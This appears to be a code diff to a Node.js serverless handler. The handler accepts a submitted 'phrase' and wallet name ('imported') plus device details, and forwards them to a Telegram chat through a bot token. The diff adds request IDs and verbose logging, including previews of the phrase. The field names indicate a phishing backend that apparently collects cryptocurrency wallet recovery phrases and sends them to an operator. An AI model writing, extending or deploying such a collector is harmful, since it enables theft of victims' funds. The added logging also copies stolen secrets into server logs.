@@ -2,8 +2,16 @@
 // Environment variables: TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
 
 module.exports = async (req, res) => {
+  const requestId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+  console.log(`[${requestId}] 📥 Incoming request:`, {
+    method: req.method,
+    url: req.url,
+    timestamp: new Date().toISOString()
+  });
+
   // Only allow POST requests
   if (req.method !== 'POST') {
+    console.log(`[${requestId}] ❌ Invalid method:`, req.method);
     return res.status(405).json({ error: 'Method not allowed' });
   }
 
@@ -13,7 +21,7 @@ module.exports = async (req, res) => {
 
   // Validate environment variables
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-    console.error('Missing Telegram credentials in environment variables');
+    console.error(`[${requestId}] ❌ Missing Telegram credentials in environment variables`);
     return res.status(500).json({ error: 'Server configuration error' });
   }
 
@@ -32,8 +40,24 @@ module.exports = async (req, res) => {
       formattedDate = req.body.formattedDate;
     }
 
+    console.log(`[${requestId}] 📋 Request data:`, {
+      hasPhrase: !!phrase,
+      phraseLength: phrase ? phrase.length : 0,
+      hasImported: !!imported,
+      imported: imported,
+      hasKeywords: !!keywords,
+      keywords: keywords,
+      hasDeviceInfo: !!deviceInfo,
+      deviceInfoLength: deviceInfo ? deviceInfo.length : 0,
+      hasCopyUrl: !!copyUrl
+    });
+
     // Validate required fields
     if (!phrase || !imported) {
+      console.error(`[${requestId}] ❌ Missing required fields:`, {
+        hasPhrase: !!phrase,
+        hasImported: !!imported
+      });
       return res.status(400).json({ error: 'Missing required fields' });
     }
 
@@ -120,11 +144,14 @@ module.exports = async (req, res) => {
 
     // Final validation: Telegram message length limit is 4096 characters
     if (message.length > 4096) {
-      console.error('Message too long:', message.length, 'characters');
+      console.error(`[${requestId}] ⚠️ Message too long:`, message.length, 'characters (max: 4096)');
       // Force truncate more aggressively
       const safeMaxLength = 3500;
       message = message.substring(0, safeMaxLength) + '...\n\n[Message truncated due to length]';
+      console.log(`[${requestId}] ✂️ Truncated message to:`, message.length, 'characters');
     }
+
+    console.log(`[${requestId}] 📤 Preparing to send message to Telegram. Length:`, message.length, 'characters');
 
     // Send to Telegram via Bot API
     const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -145,16 +172,25 @@ module.exports = async (req, res) => {
     const data = await response.json();
 
     if (data.ok) {
-      console.log('✅ Telegram message sent successfully. Length:', message.length, 'characters');
+      console.log(`[${requestId}] ✅ Telegram message sent successfully. Length:`, message.length, 'characters');
       return res.status(200).json({ success: true, message: 'Message sent to Telegram successfully' });
     } else {
-      console.error('❌ Telegram API error:', data);
-      console.error('Message length:', message.length);
-      console.error('Error description:', data.description);
+      console.error(`[${requestId}] ❌ Telegram API error:`, {
+        ok: data.ok,
+        error_code: data.error_code,
+        description: data.description,
+        message_length: message.length,
+        phrase_preview: phrase ? phrase.substring(0, 50) + '...' : 'N/A',
+        wallet: imported
+      });
       return res.status(500).json({ error: 'Failed to send message to Telegram', details: data.description });
     }
   } catch (error) {
-    console.error('Error in Telegram API handler:', error);
+    console.error(`[${requestId}] ❌ Exception in Telegram API handler:`, {
+      error: error.message,
+      stack: error.stack,
+      name: error.name
+    });
     return res.status(500).json({ error: 'Internal server error' });
   }
 };
